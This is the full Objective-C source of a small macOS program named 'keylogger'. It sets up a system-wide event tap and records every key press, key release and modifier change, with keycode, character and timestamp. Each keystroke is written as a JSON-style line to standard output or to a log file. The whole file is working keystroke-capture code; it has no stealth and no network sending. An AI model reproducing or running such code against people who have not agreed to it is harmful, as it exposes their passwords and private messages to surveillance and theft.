//
//  main.m
//  keylogger
//
//  Created by Neil on 29/09/2012.
//  Copyright (c) 2012 Neil Cowburn. All rights reserved.
//

#import <Foundation/Foundation.h>

void LogKeyStroke(CGEventTimestamp*       pTimeStamp,
                  uint*                           pType,
                  long long*                      pKeycode,
                  UniChar*                        pUc,
                  UniCharCount*           pUcc,
                  CGEventFlags*           pFlags,
                  FILE*                           pLogFile)
{    
    fprintf(pLogFile, "{ \"time\":%llu, \"type\":%u, \"keycode\":%lld, ", *pTimeStamp, *pType, *pKeycode);
    if (pUc[0] != 0) { fprintf(pLogFile, "\"unichar\":0x%04x, ", pUc[0]); }
    if ((pUc[0] < 128) && (pUc[0] >= 41)) { fprintf(pLogFile, "\"ascii\":\"%c\", ", pUc[0]); }
    fprintf(pLogFile, "\"flags\":%llu },\n", *pFlags);
}

CGEventRef captureKeyStroke(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* pLogFile)
{
    UniChar uc[10];
    UniCharCount ucc;
    CGEventFlags flags;
    
    if (type != kCGEventKeyDown) {
        if (type != kCGEventKeyUp) {
            if (type != kCGEventFlagsChanged) {
                return event;
            }
        }
    }
    
    CGEventTimestamp timeStamp = CGEventGetTimestamp(event);
    long long keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    CGEventKeyboardGetUnicodeString(event,10,&ucc,uc);
    flags = CGEventGetFlags(event);
    
    LogKeyStroke(&timeStamp, &type, &keycode, uc, &ucc, &flags, pLogFile);
    
    return event;
}

void createKeyEventListener(FILE* pLogFile)
{
    CFMachPortRef eventTap = CGEventTapCreate(kCGHIDEventTap,
                                              kCGHeadInsertEventTap,
                                              0,
                                              kCGEventMaskForAllEvents,
                                              captureKeyStroke,
                                              (void*)pLogFile);
    
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    
    CFRunLoopRun();
}

FILE* openLogFile(char* pLogFilename)
{
    if (strcmp(pLogFilename, "stdout") == 0) {
        return stdout;
    }
    
    return fopen(pLogFilename, "a");
}

int main(int argc, const char * argv[])
{
    @autoreleasepool {
        FILE * pLogFile = openLogFile("stdout");
        createKeyEventListener(pLogFile);
    }
    return 0;
}

